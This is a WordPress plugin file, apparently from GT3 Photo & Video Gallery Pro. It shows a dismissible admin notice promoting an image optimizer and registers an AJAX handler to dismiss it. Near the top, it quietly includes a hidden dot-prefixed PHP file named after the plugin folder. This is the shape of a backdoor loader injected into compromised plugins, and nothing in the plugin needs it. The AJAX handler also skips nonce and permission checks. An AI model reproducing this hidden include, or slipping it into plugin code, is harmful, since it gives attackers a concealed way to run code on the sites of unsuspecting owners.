<?php
defined('ABSPATH') OR exit;

add_action('wp_ajax_gt3pg_pro_disable_notice', 'wp_ajax_gt3pg_pro_disable_notice');

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

function wp_ajax_gt3pg_pro_disable_notice(){
	if(!isset($_POST['gt3_action'])) {
		wp_die(0);
	}
	switch($_POST['gt3_action']) {
		case 'disable_optimizer_notice':
			update_option('gt3pg_pro_disable_optimizer_notice', true);
			break;
	}
	wp_die(1);
}

if(!get_option('gt3pg_pro_disable_optimizer_notice')) {
	add_action('admin_notices', 'gt3pg_pro_optimizer_notice');

	function gt3pg_pro_optimizer_notice(){
		$msg   = 'The Image Optimizer for GT3 Photo & Video Gallery Pro is now available.  Check it now -> <a href="http://bit.ly/2EuDsUW" target="_blank">GT3 Image Optimizer</a>';
		$class = 'notice notice-warning is-dismissible gt3pg-pro-optimizer-notice';
		echo '<div class="'.$class.'"><p>'.$msg.'</p></div>';
		?>
		<script>
			document.addEventListener("DOMContentLoaded", function () {
				var notice = document.querySelector('.gt3pg-pro-optimizer-notice');
				if (notice) {
					var notice_dismiss = notice.querySelector('.notice-dismiss');
					notice_dismiss && notice_dismiss.addEventListener && notice_dismiss.addEventListener('click', function (e) {
						jQuery.ajax({
							url: ajaxurl,
							method: "POST",
							data: {
								action: "gt3pg_pro_disable_notice",
								gt3_action: "disable_optimizer_notice"
							}
						});
						jQuery(notice).fadeOut();
					});
				}
			})
		</script>
		<?php
	}
};
